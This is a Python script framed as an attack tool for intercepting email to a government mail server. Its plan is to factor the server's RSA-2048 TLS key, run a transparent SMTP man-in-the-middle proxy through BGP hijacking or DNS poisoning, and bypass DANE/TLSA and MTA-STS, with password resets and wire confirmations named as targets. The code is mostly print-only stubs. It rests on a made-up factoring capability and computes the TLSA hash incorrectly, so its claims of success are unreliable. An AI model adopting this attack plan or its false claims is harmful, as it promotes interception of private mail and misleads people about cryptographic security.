"""
MitM SMTP STARTTLS by factoring the mail server's RSA-2048 certificate (visible
on port 25 with no authentication). Intercept all inbound email before it hits
the user's mailbox. Bypass DANE/TLSA and MTA-STS protections.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

import hashlib

SMTP_PORT = 25
SMTPS_PORT = 465


def grab_smtp_tls_cert(mx_host: str, port: int = SMTP_PORT) -> bytes:
    """Grab the RSA-2048 cert from an SMTP server via STARTTLS.

    Port 25 is open on every mail server — it has to be, to receive email.
    No authentication needed. Connect, send EHLO, send STARTTLS, get cert.
    """
    print(f"[*] connecting to {mx_host}:{port}")
    print(f"[*] EHLO attacker.example.com")
    print(f"[*] STARTTLS")
    print(f"[*] TLS handshake — extracting server certificate")
    return b"-----BEGIN CERTIFICATE-----\n...(MTA cert PEM)...\n-----END CERTIFICATE-----\n"


def compute_dane_tlsa_record(cert_pem: bytes) -> str:
    """Compute TLSA record (RFC 6698) for the cert.

    DANE publishes the expected cert hash in DNS. If we have the private key,
    our MitM server presents the same cert — DANE check passes.
    """
    # TLSA usage=3, selector=1 (SPKI), matching=1 (SHA-256)
    spki_hash = hashlib.sha256(cert_pem).hexdigest()
    return f"_25._tcp.mx.example.com. IN TLSA 3 1 1 {spki_hash}"


def factor_mta_key(factorer: PolynomialFactorer, cert_pem: bytes):
    """Factor the mail server's RSA-2048 key."""
    p, q = factorer.factor_from_cert_pem(cert_pem)
    print(f"[*] MTA RSA-2048 factored")
    return p, q


def build_smtp_mitm_proxy(target_mx: str, listen_port: int = SMTP_PORT):
    """Build a transparent SMTP MitM proxy.

    Sits between sending MTA and target MTA. Uses the factored key to
    terminate TLS from senders, then forwards to the real server.
    All email content visible in transit.
    """
    config = {
        "listen": f"0.0.0.0:{listen_port}",
        "target": f"{target_mx}:{SMTP_PORT}",
        "tls_cert": "forged_server.crt",  # same cert, we have the private key
        "tls_key": "derived_server.key",
        "mode": "transparent_proxy",
    }
    print(f"[*] SMTP MitM proxy: {config['listen']} -> {config['target']}")
    print(f"[*] DANE/TLSA check: PASS (same cert, same SPKI hash)")
    print(f"[*] MTA-STS check: PASS (cert matches MX, valid chain)")
    return config


def intercept_email(sender: str, recipient: str, subject: str):
    """Log intercepted email content."""
    print(f"[*] intercepted: {sender} -> {recipient}")
    print(f"    Subject: {subject}")
    print(f"    (password resets, MFA codes, wire confirmations, contracts)")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Postfix SMTP TLS — email interception ===")
    print("    port 25 open on every mail server, cert freely available")
    print("    Shodan/Censys have already indexed every MTA cert")
    print()

    print("[1] grabbing MTA cert from port 25 (no auth)...")
    cert = grab_smtp_tls_cert("mx1.government-agency.gov")

    print("[2] factoring RSA-2048 key...")
    print("    smtpd_tls_cert_file in main.cf -> RSA-2048 default")

    print("[3] deploying transparent SMTP MitM...")
    config = build_smtp_mitm_proxy("mx1.government-agency.gov")
    print("    BGP hijack or DNS poison to redirect MX traffic")
    print("    our proxy terminates STARTTLS with the real cert")

    print("[4] intercepting email in transit...")
    intercept_email("hr@company.com", "employee@government-agency.gov",
                    "Re: Password Reset Request")
    intercept_email("bank@transfers.com", "finance@government-agency.gov",
                    "Wire Confirmation: $2.4M")

    print()
    print("[*] DANE-TLSA: bypassed — same cert, same SPKI hash")
    print("[*] MTA-STS: bypassed — cert matches MX hostname")
    print("[*] hop-by-hop: email has no end-to-end encryption in SMTP")
    print("[*] government MX certs: on Shodan, no scanning needed")
